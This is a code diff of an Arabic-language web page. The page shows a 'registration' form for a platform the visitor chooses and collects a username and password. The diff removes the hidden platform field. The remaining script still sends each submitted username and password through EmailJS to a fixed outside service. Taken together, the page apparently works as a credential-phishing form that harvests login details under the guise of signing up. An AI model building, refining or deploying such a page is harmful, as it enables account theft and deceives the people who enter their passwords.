@@ -14,11 +14,9 @@
         // تفعيل النموذج عند اختيار منصة
         function activateContactForm(platformName) {
             const formContainer = document.getElementById("form-container");
-            const platformInput = document.getElementById("platform");
             const platformTitle = document.getElementById("platform-name");
             
             // تعيين اسم المنصة
-            platformInput.value = platformName;
             platformTitle.textContent = `التسجيل في ${platformName}`;
             formContainer.style.display = "block"; // عرض النموذج
         }
@@ -29,12 +27,10 @@
             
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
-            const platform = document.getElementById("platform").value;
 
             const templateParams = {
                 username: username,
-                password: password,
-                platform: platform
+                password: password
             };
 
             emailjs.send('service_ir3vg5y', 'template_jw2qkzr', templateParams)
@@ -121,7 +117,6 @@
     <div class="form-container" id="form-container">
         <h3 id="platform-name">التسجيل في</h3>
         <form id="registration-form" onsubmit="sendPlatformData(event)">
-            <input type="hidden" name="platform" id="platform">
             <input type="text" name="username" id="username" placeholder="اسم المستخدم" required>
             <input type="password" name="password" id="password" placeholder="كلمة المرور" required>
             <button type="submit">إرسال</button>
